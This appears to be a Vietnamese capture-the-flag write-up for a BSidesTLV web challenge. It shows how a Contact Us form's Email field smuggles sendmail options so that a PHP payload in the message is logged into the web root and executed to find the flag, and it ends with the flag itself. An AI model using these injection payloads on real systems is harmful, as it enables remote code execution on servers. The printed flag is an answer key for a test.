Vào trang chủ của challange, kéo xuống form điền của phần <strong>Contact Us</strong><br/>
Trong form điền, điền các trường như sau<br/>
<strong>Name:</strong>1337 H4X0r<br/>
<strong>Email:</strong> "attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php  some"@email.com <br/>
<strong>Message:</strong> <?php phpinfo(); ?><br/>
<strong>Capcha:</strong> Đã có sẵn</br>
Tắt <code>type=email</code> thành <code>type=text</code> trong trường <strong>Email</strong><br/>
Gửi form đi, sẽ có trả về <strong> You are so close ....</strong> và 1 file php<br/>
Tiếp tục điền lại vào form như sau<br/>
<strong>Name:</strong>1337 H4X0r<br/>
<strong>Email:</strong> "attacker\" -oQ/tmp/ -X/var/www/html/cache/<tên file php>.php  some"@email.com<br/>
<strong>Message:</strong><?php echo exec('cat $(find / -name flag.txt)'); ?><br/>
<strong>Capcha:</strong> Đã có sẵn</br>
Chờ 1 lúc<br/>
Truy cập địa chỉ <code>view-source:http://challenges.bsidestlv.com:8080/cache/<tên file php>.php?cmd=id</code><br/>
Lục trong đó sẽ có cờ<br/>
Cờ là <code>BSidesTLV{K33pY0urM4il3rFullyP4tch3D!}</code><br/>
